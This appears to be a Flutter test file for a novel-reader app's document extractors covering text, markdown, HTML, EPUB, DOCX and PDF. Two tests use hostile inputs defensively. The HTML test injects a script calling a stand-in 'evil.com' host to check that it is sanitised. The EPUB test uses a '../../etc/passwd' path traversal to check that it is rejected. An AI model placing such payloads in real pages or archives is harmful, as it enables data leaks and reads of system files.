import 'dart:convert';
import 'dart:io';

import 'package:archive/archive.dart';
import 'package:emotional_novel_reader/features/import/domain/extractors/docx_extractor.dart';
import 'package:emotional_novel_reader/features/import/domain/extractors/epub_extractor.dart';
import 'package:emotional_novel_reader/features/import/domain/extractors/html_extractor.dart';
import 'package:emotional_novel_reader/features/import/domain/extractors/markdown_extractor.dart';
import 'package:emotional_novel_reader/features/import/domain/extractors/pdf_extractor.dart';
import 'package:emotional_novel_reader/features/import/domain/extractors/txt_extractor.dart';
import 'package:flutter_test/flutter_test.dart';

void main() {
  late Directory tempDir;

  setUp(() {
    tempDir = Directory.systemTemp.createTempSync('extractor_test_');
  });

  tearDown(() {
    tempDir.deleteSync(recursive: true);
  });

  group('Document Extractors tests', () {
    test('TxtExtractor extracts chapters matching chapter pattern', () async {
      const textContent = '''
Chapter 1: The Beginning
The hero awoke in a quiet forest. Sunlight filtered through the leaves.

Chapter 2: The Encounter
Walking down the path, he spotted an ancient stone shrine.
''';
      final file = File('${tempDir.path}/novel.txt')
        ..writeAsStringSync(textContent);
      const extractor = TxtExtractor();

      final result = await extractor.extract(file);
      expect(result.isSuccess, isTrue);

      final data = result.dataOrNull!;
      expect(data.title, 'novel');
      expect(data.format, 'txt');
      expect(data.chapters.length, 2);
      expect(data.chapters[0].title, 'Chapter 1: The Beginning');
      expect(data.chapters[0].content, contains('The hero awoke'));
      expect(data.chapters[1].title, 'Chapter 2: The Encounter');
      expect(data.chapters[1].content, contains('Walking down the path'));
    });

    test(
      'TxtExtractor partitions into sections when no chapter headings exist',
      () async {
        final longText = List.generate(
          500,
          (i) => 'Paragraph $i describes the journey into the valley.',
        ).join('\n\n');
        final file = File('${tempDir.path}/continuous.txt')
          ..writeAsStringSync(longText);
        const extractor = TxtExtractor();

        final result = await extractor.extract(file);
        expect(result.isSuccess, isTrue);

        final data = result.dataOrNull!;
        expect(data.chapters.isNotEmpty, isTrue);
        expect(data.chapters.first.title, startsWith('Section 1'));
      },
    );

    test(
      'MarkdownExtractor extracts title and chapters from headings',
      () async {
        const mdContent = '''
# Ascendance of a Reader

## Prologue
A quiet room filled with books.

## Chapter 1: The Awakening
The morning sun beamed warmly through the window.
''';
        final file = File('${tempDir.path}/book.md')
          ..writeAsStringSync(mdContent);
        const extractor = MarkdownExtractor();

        final result = await extractor.extract(file);
        expect(result.isSuccess, isTrue);

        final data = result.dataOrNull!;
        expect(data.title, 'Ascendance of a Reader');
        expect(data.chapters.length, 2);
        expect(data.chapters[0].title, 'Prologue');
        expect(data.chapters[1].title, 'Chapter 1: The Awakening');
      },
    );

    test(
      'HtmlExtractor sanitizes script tags and extracts clean text',
      () async {
        const htmlContent = '''
<!DOCTYPE html>
<html>
<head>
  <title>Cyber Novel</title>
  <script>alert('malicious script');</script>
</head>
<body>
  <h1>Chapter 1: Neon Lights</h1>
  <p>The city was alive with neon reflections.</p>
  <script>fetch('https://evil.com/leak');</script>
</body>
</html>
''';
        final file = File('${tempDir.path}/index.html')
          ..writeAsStringSync(htmlContent);
        const extractor = HtmlExtractor();

        final result = await extractor.extract(file);
        expect(result.isSuccess, isTrue);

        final data = result.dataOrNull!;
        expect(data.title, 'Cyber Novel');
        expect(data.chapters.length, 1);
        expect(
          data.chapters.first.content,
          contains('The city was alive with neon reflections.'),
        );
        expect(data.chapters.first.content, isNot(contains('malicious')));
        expect(data.chapters.first.content, isNot(contains('evil.com')));
      },
    );

    test(
      'EpubExtractor extracts metadata, spine order, and XHTML chapters',
      () async {
        final archive = Archive();

        // 1. mimetype
        archive.addFile(
          ArchiveFile('mimetype', 20, 'application/epub+zip'.codeUnits),
        );

        // 2. META-INF/container.xml
        const containerXml = '''<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''';
        archive.addFile(
          ArchiveFile(
            'META-INF/container.xml',
            containerXml.length,
            containerXml.codeUnits,
          ),
        );

        // 3. OEBPS/content.opf
        const opfXml = '''<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Test EPUB Novel</dc:title>
    <dc:creator>Author Person</dc:creator>
  </metadata>
  <manifest>
    <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="ch1"/>
    <itemref idref="ch2"/>
  </spine>
</package>''';
        archive.addFile(
          ArchiveFile('OEBPS/content.opf', opfXml.length, opfXml.codeUnits),
        );

        // 4. OEBPS/ch1.xhtml
        const ch1Xml = '''<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head><title>Chapter 1: The Call</title></head>
  <body>
    <h1>Chapter 1: The Call</h1>
    <p>The messenger arrived at dawn bearing critical news.</p>
  </body>
</html>''';
        archive.addFile(
          ArchiveFile('OEBPS/ch1.xhtml', ch1Xml.length, ch1Xml.codeUnits),
        );

        // 5. OEBPS/ch2.xhtml
        const ch2Xml = '''<?xml version="1.0" encoding="utf-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
  <head><title>Chapter 2: The Departure</title></head>
  <body>
    <h1>Chapter 2: The Departure</h1>
    <p>Packing his few belongings, he embarked on the long journey.</p>
  </body>
</html>''';
        archive.addFile(
          ArchiveFile('OEBPS/ch2.xhtml', ch2Xml.length, ch2Xml.codeUnits),
        );

        final zipBytes = ZipEncoder().encode(archive);
        final epubFile = File('${tempDir.path}/test.epub')
          ..writeAsBytesSync(zipBytes);

        const extractor = EpubExtractor();
        final result = await extractor.extract(epubFile);

        expect(result.isSuccess, isTrue);
        final data = result.dataOrNull!;
        expect(data.title, 'Test EPUB Novel');
        expect(data.author, 'Author Person');
        expect(data.format, 'epub');
        expect(data.chapters.length, 2);
        expect(data.chapters[0].title, 'Chapter 1: The Call');
        expect(data.chapters[0].content, contains('The messenger arrived'));
        expect(data.chapters[1].title, 'Chapter 2: The Departure');
        expect(
          data.chapters[1].content,
          contains('Packing his few belongings'),
        );
      },
    );

    test('DocxExtractor extracts paragraphs and headings', () async {
      final archive = Archive();
      const docXml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:pPr><w:pStyle w:val="Heading1"/></w:pPr>
      <w:r><w:t>Chapter 1: Discovery</w:t></w:r>
    </w:p>
    <w:p>
      <w:r><w:t>In the dusty archives, a hidden tome was uncovered.</w:t></w:r>
    </w:p>
  </w:body>
</w:document>''';
      archive.addFile(
        ArchiveFile('word/document.xml', docXml.length, docXml.codeUnits),
      );

      final zipBytes = ZipEncoder().encode(archive);
      final docxFile = File('${tempDir.path}/test.docx')
        ..writeAsBytesSync(zipBytes);

      const extractor = DocxExtractor();
      final result = await extractor.extract(docxFile);

      expect(result.isSuccess, isTrue);
      final data = result.dataOrNull!;
      expect(data.format, 'docx');
      expect(data.chapters.length, 1);
      expect(data.chapters.first.title, 'Chapter 1: Discovery');
      expect(data.chapters.first.content, contains('In the dusty archives'));
    });

    test(
      'PdfExtractor fails safely on scanned or image-only PDF without OCR',
      () async {
        final pdfBytes = [
          0x25,
          0x50,
          0x44,
          0x46,
          0x2D,
          0x31,
          0x2E,
          0x34,
          0x0A,
          0x25,
          0xC4,
          0xE5,
          0xF2,
          0xE5,
          0x0A,
        ];
        final pdfFile = File('${tempDir.path}/scanned.pdf')
          ..writeAsBytesSync(pdfBytes);

        const extractor = PdfExtractor();
        final result = await extractor.extract(pdfFile);

        expect(result.isError, isTrue);
        expect(
          result.failureOrNull?.message,
          contains('OCR extraction is currently unsupported'),
        );
      },
    );

    test('PdfExtractor extracts text from uncompressed text stream with array kerning and unescaping', () async {
      const pdfContent = '''%PDF-1.4
1 0 obj
<< /Length 85 >>
stream
BT
/F1 12 Tf
(Chapter 1: The Gathering) Tj
[(Packed with ) -10 (excitement)] TJ
(Special characters: \\(parenthesis\\) and \\\\slash) Tj
(Octal: \\101\\102\\103) Tj
ET
endstream
endobj
trailer
<< /Root 1 0 R >>
%%EOF''';

      final pdfFile = File('${tempDir.path}/uncompressed.pdf')
        ..writeAsStringSync(pdfContent);

      const extractor = PdfExtractor();
      final result = await extractor.extract(pdfFile);

      expect(result.isSuccess, isTrue);
      final data = result.dataOrNull!;
      expect(data.format, 'pdf');
      expect(data.chapters.length, 1);
      expect(data.chapters.first.content, contains('Chapter 1: The Gathering'));
      expect(data.chapters.first.content, contains('Packed with excitement'));
      expect(
        data.chapters.first.content,
        contains('(parenthesis) and \\slash'),
      );
      expect(data.chapters.first.content, contains('Octal: ABC'));
    });

    test(
      'PdfExtractor extracts text from FlateDecode compressed stream',
      () async {
        const streamText = '''BT
/F1 14 Tf
(Chapter 2: The Journey Begins) Tj
(Through the misty mountain pass they traveled silently.) Tj
ET''';

        final compressedBytes = zlib.encode(utf8.encode(streamText));

        final header = utf8.encode('''%PDF-1.4
1 0 obj
<< /Length ${compressedBytes.length} /Filter /FlateDecode >>
stream\r\n''');

        final footer = utf8.encode('''\r\nendstream
endobj
trailer
<< /Root 1 0 R >>
%%EOF''');

        final fullPdfBytes = <int>[...header, ...compressedBytes, ...footer];
        final pdfFile = File('${tempDir.path}/compressed.pdf')
          ..writeAsBytesSync(fullPdfBytes);

        const extractor = PdfExtractor();
        final result = await extractor.extract(pdfFile);

        expect(result.isSuccess, isTrue);
        final data = result.dataOrNull!;
        expect(data.format, 'pdf');
        expect(
          data.chapters.first.content,
          contains('Chapter 2: The Journey Begins'),
        );
        expect(
          data.chapters.first.content,
          contains('Through the misty mountain pass'),
        );
      },
    );

    test(
      'PdfExtractor rejects malformed PDF with invalid header signature',
      () async {
        final corruptedFile = File('${tempDir.path}/corrupt.pdf')
          ..writeAsBytesSync([0x00, 0x01, 0x02, 0x03, 0x04, 0x05]);

        const extractor = PdfExtractor();
        final result = await extractor.extract(corruptedFile);

        expect(result.isError, isTrue);
        expect(
          result.failureOrNull?.message,
          contains('Invalid PDF header signature'),
        );
      },
    );

    test('PdfExtractor decodes subsetted fonts using embedded /ToUnicode CMap and handles kerning spacing', () async {
      const cmapStream = '''
/CIDInit /ProcSet findresource begin
12 dict begin
begincmap
/CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def
/CMapName /CustomCMap def
1 begincodespacerange
<0000> <FFFF>
endcodespacerange
1 beginbfchar
<0050> <005A>
endbfchar
1 beginbfrange
<0001> <0003> <0041>
endbfrange
endcmap
CMapName currentdict /CMap defineresource pop
end
end''';

      const contentStream = '''
BT
/F1 12 Tf
<0001000200030050> Tj
[(Custom) -250 (Spacing) -20 (Test)] TJ
ET''';

      const pdfContent =
          '''%PDF-1.4
1 0 obj
<< /Length ${cmapStream.length} >>
stream
$cmapStream
endstream
endobj
2 0 obj
<< /Length ${contentStream.length} >>
stream
$contentStream
endstream
endobj
trailer
<< /Root 1 0 R >>
%%EOF''';

      final pdfFile = File('${tempDir.path}/cmap_test.pdf')
        ..writeAsStringSync(pdfContent);

      const extractor = PdfExtractor();
      final result = await extractor.extract(pdfFile);

      expect(result.isSuccess, isTrue);
      final data = result.dataOrNull!;
      expect(data.format, 'pdf');
      expect(data.chapters.length, 1);
      // <0001000200030050> maps 1->A, 2->B, 3->C via bfrange, and 0x50->Z via bfchar => "ABCZ"
      expect(data.chapters.first.content, contains('ABCZ'));
      // [(Custom) -250 (Spacing) -20 (Test)] TJ should have space between Custom and Spacing due to -250 kerning
      expect(data.chapters.first.content, contains('Custom Spacing'));
    });

    test(
      'EpubExtractor rejects path traversal in container.xml full-path',
      () async {
        final archive = Archive();
        archive.addFile(
          ArchiveFile('mimetype', 20, 'application/epub+zip'.codeUnits),
        );
        const evilContainerXml = '''<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="../../etc/passwd" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''';
        archive.addFile(
          ArchiveFile(
            'META-INF/container.xml',
            evilContainerXml.length,
            evilContainerXml.codeUnits,
          ),
        );

        final zipBytes = ZipEncoder().encode(archive);
        final evilEpub = File('${tempDir.path}/evil.epub')
          ..writeAsBytesSync(zipBytes);

        const extractor = EpubExtractor();
        final result = await extractor.extract(evilEpub);

        expect(result.isError, isTrue);
        expect(
          result.failureOrNull?.message,
          contains('Path traversal detected'),
        );
      },
    );
  });
}
